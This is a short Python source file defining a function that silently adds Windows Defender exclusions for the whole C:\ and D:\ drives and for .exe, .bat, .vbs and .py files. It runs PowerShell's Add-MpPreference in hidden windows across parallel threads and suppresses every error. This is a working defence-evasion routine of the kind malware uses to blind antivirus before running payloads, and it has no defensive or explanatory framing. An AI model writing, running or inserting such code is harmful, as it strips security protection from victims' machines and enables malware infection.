import os
import threading
import subprocess
import ctypes

def excludeme():
    def add_exclusion(path_or_extension):
        try:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            subprocess.run(
                ["powershell", "-Command", f"Add-MpPreference -ExclusionPath '{path_or_extension}'"],
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW,
                check=True,
            )
        except subprocess.CalledProcessError:
            pass

    threads = []
    exclusions = ['C:\\', 'D:\\', '.exe', '.bat', '.vbs', '.py', '.pyw']
    for exclusion in exclusions:
        thread = threading.Thread(target=add_exclusion, args=(exclusion,))
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()